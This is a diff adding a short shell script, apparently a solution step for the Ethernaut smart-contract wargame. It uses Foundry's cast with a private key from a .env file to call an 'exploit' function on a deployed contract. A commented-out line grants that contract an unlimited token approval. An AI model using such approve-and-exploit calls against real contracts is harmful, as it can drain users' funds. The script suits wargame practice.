@@ -1,0 +1,15 @@
+source ~/ethernauts/.env
+echo "RPC_URL: $RPC_URL"
+
+# cast send \
+#     --rpc-url $RPC_URL \
+#     0x07Feb7Ec8732C843A1460690f4138336Ad7A08E0 \
+#     --private-key $PRIVATE_KEY \
+#     "approve(address, uint256)" 0x849d79048c3911Ff0c79CEE8DDFB8D2931CE7EF6 115792089237316195423570985008687907853269984665640564039457584007913129639935
+
+
+cast send \
+    --rpc-url $RPC_URL \
+    0x849d79048c3911Ff0c79CEE8DDFB8D2931CE7EF6 \
+    --private-key $PRIVATE_KEY \
+    "exploit(address)()" $SECONDARY_ADDRESS
